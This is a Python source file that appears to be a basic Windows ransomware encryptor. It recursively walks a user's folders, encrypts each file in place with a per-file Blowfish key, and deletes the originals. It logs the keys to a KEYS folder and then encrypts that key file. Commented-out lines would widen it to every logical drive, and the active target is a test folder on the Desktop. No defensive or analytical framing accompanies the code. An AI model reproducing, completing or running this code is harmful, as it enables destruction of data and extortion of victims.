import blowfish
from cryptography.fernet import Fernet
import os
from colorama import init, Fore, Back, Style
from termcolor import colored
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

init()
user = os.getlogin()
keys_folder = 'C:\\Users\\' + user + '\\KEYS'

def get_details(file):
	file = file.split('\\')
	length = len(file)
	filename = file[length-1]
	path = ''
	for i in range(length-1):
		path += file[i] + "\\"
	return [path, filename]

def encrypt(file):
	temp = file.split('.')
	if temp[len(temp)-1] == 'm0ng0l14n' or temp[len(temp)-1] == 'key':
		return
	key = Fernet.generate_key()
	cipher = blowfish.Cipher(key)
	with open(keys_folder + "\\key.key",'ab+') as keyfile:
		keyfile.write((file.encode() + "-->".encode() + key + "\n".encode()))
		keyfile.close()
		with open(file,'rb') as pfile:
			details = get_details(file)
			with open((details[0]+details[1]+'.temp'),'wb') as cfile:
				data = pfile.read(8)
				lst = []
				while data:
					bytes = len(data)
					if bytes < 8:
						data += b' '*(8-bytes)
					cfile.write(cipher.encrypt_block(data))
					data = pfile.read(8)
		os.remove((details[0]+details[1]))
		os.rename((details[0]+details[1]+'.temp'), (details[0]+details[1]))
	return True

def dir(path):
	try:
		lst = os.listdir(path)
		for i in range(len(lst)):
			lst[i] = path + "\\" + lst[i]
			if 'KEYS\\' not in lst[i] or 'm0ng0li4n\\' not in lst[i]:
				dir(lst[i])
			else:
				pass
	except:
		try:
			status = encrypt(path)
			if status == True:
				print(colored(Fore.GREEN + '[+] ' + path))
			else:
				print(colored(Fore.YELLOW + Style.DIM + '[-] ' +path))
		except:
			pass

def encryptKey():
	file = keys_folder + "\\key.key"
	key = Fernet.generate_key()
	cipher = blowfish.Cipher(key)
	with open(keys_folder + "\\symmetricKey.key",'wb+') as keyfile:
		keyfile.write((file.encode() + "-->".encode() + key + "\n".encode()))
		keyfile.close()
		with open(file,'rb') as pfile:
			details = get_details(file)
			with open((details[0]+details[1]+'.temp'),'wb') as cfile:
				data = pfile.read(8)
				lst = []
				while data:
					bytes = len(data)
					if bytes < 8:
						data += b' '*(8-bytes)
					cfile.write(cipher.encrypt_block(data))
					data = pfile.read(8)
		os.remove((details[0]+details[1]))
		os.rename((details[0]+details[1]+'.temp'), (details[0]+details[1]))
	print(colored(Fore.GREEN + "[+] KEYS ENCRYPTED"))

def main():
	global keys_folder, user
	try:
		os.makedirs(keys_folder)
	except:
		pass
#	drives = win32api.GetLogicalDriveStrings()
#	drives = drives.split('\000')[:-1]
#	for drive in drives:
#		dir(drive)
	dir('C:\\Users\\'+ user +'\\Desktop\\New folder')
#	dir("C:")
	encryptKey()
